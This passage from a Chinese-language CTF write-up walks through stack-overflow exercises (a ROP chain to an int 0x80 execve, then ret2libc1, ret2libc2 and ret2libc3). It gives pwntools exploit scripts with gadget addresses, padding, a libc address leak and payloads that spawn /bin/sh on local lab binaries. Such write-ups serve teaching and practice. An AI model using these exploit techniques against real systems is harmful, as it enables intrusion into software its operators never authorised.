src="https://img-blog.csdnimg.cn/20190227225240795.png" alt="img"></p><p>找到 pop eax,ret，以同样的方法找到 ebx.ecx.edx 以及 int 80h 系统调用和 bin/sh</p><p><img src="https://img-blog.csdnimg.cn/20190227225941829.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20190227230001980.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20190227230010832.png" alt="img"></p><p>接下来要了解 payload 这样构成的原因，需要知道这三个指令</p><p><img src="https://img-blog.csdnimg.cn/20190227230150786.png" alt="img"></p><p>在堆栈里，我们知道 ebp+4 的地方为返回地址。这是因为 leave 时 esp=ebp+4,ret 将当前 esp 指向的值作为返回地址跳转并且 ESP+4。</p><p>所以构造 payload 为 payload = flat ([‘A’ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])</p><p>先用 112 个 A 填充，pop_eax_ret 为第一个返回地址，然后 ESP 指向 0xb, 以此类推。</p><p>写出 python 脚本，之前都解释过 不再注释了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">context.binary= <span class="string">&#x27;rop&#x27;</span></span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x80be409</span></span><br><span class="line">int_0x80 = <span class="number">0x8049421</span></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2libc1"><a class="markdownIt-Anchor" href="#ret2libc1">#</a> ret2libc1</h2><p>给出 got 表 PLT 表 以及 libc 的相关解释，我觉得写的很清楚</p><p><a href="https://blog.csdn.net/Retrovich/article/details/82973086">https://blog.csdn.net/Retrovich/article/details/82973086</a></p><p>基本流程仍然相似，先检查保护</p><p><img src="https://img-blog.csdnimg.cn/20190228112803224.png" alt="img"></p><p>只打开了 NX</p><p>检查是否存在 /bin/sh</p><p><img src="https://img-blog.csdnimg.cn/20190228122346772.png" alt="img"></p><p>在 IDA 中查找 system 函数</p><p><img src="https://img-blog.csdnimg.cn/20190228113556749.png" alt="img"></p><p>查看到 ptl 处的 system 函数</p><p>写 Python 脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = <span class="string">&#x27;ret2libc1&#x27;</span></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line">binsh = <span class="number">0x8049720</span></span><br><span class="line">system = <span class="number">0x8048460</span></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span>*<span class="number">112</span>+system+<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>+binsh])<span class="string">&quot;&quot;&quot;这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以&#x27;bbbb&#x27; 作为虚假的地址，其后参数对应的参数内容。&quot;&quot;&quot;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2libc2"><a class="markdownIt-Anchor" href="#ret2libc2">#</a> ret2libc2</h2><p>这里仍然用相同的流程，唯一不同的是没有直接给出 /bin/sh, 需要先调用 gets 函数再利用 pop ret 调用 system 函数</p><p><img src="https://img-blog.csdnimg.cn/20190228160834983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><p>直接给出 python 的脚本，与上一个例子相同，整体不再多赘述</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">pop_ebx = <span class="number">0x0804843d</span></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, gets_plt, pop_ebx, buf2, system_plt, <span class="number">0xdeadbeef</span>, buf2])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>我给出了堆栈溢出的 ESP 指向流程图，顺着思考容易看懂 payload</p><p><img src="https://img-blog.csdnimg.cn/20190228160353314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><h2 id="ret2libc3"><a class="markdownIt-Anchor" href="#ret2libc3">#</a> ret2libc3</h2><p><img src="https://img-blog.csdnimg.cn/20190228171912573.png" alt="img"></p><p>检查安全保护，只开启了 NX</p><p><img src="https://img-blog.csdnimg.cn/20190228195219362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><p>IDA 里查看，仍然是 gets 函数的堆栈溢出。</p><p>但是这里没有给 system 函数</p><p>也没有给定的 /bin/sh</p><p>所以需要我们从 libc 中调用 system 函数</p><p><img src="https://img-blog.csdnimg.cn/20190228195812530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><p>根据这个知识点</p><p>写 exp, 涉及新的东西我仍然全部做注释</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">context.binary=<span class="string">&#x27;ret2libc3&#x27;</span></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(<span class="string">&#x27;ret2libc3&#x27;</span>) <span class="comment">#静态加载ELF文件</span></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>] <span class="comment">#获取指定文件的plt条目</span></span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">&#x27;__libc_start_main&#x27;</span>] <span class="comment">#获取指定文件的got条目</span></span><br><span class="line">main = ret2libc3.symbols[<span class="string">&#x27;_start&#x27;</span>] <span class="comment">#获取指定文件的函数地址</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak main_got addr and return main&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span>*<span class="number">112</span>,puts_plt,main,libc_start_main_got]) <span class="comment">#先使用plts_plt函数打印出main函数的在got表中的真实地址</span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Can you find it !?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">libc_start_main_addr = u32(sh.recv()[<span class="number">0</span>:<span class="number">4</span>]) <span class="comment">#获取main函数的真实地址</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,libc_start_main_addr) <span class="comment">#获取libc</span></span><br><span class="line">libcbase = libc_start_main_addr-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>) <span class="comment">#获取libc基地址</span></span><br><span class="line">system_addr = libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>) <span class="comment">#获取system地址</span></span><br><span class="line">binsh_addr = libcbase +libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) <span class="comment">#获取binsh字符串地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;now get shell&quot;</span>)</span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span>*<span class="number">112</span>,system_addr,<span class="string">&#x27;A&#x27;</span>*<span class="number">4</span>,binsh_addr]) <span class="comment">#这里开头‘A’的数量要具体到堆栈里调试观察，因为main函数开头先将ESP最后一位变为0即16位对齐，再减128.</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
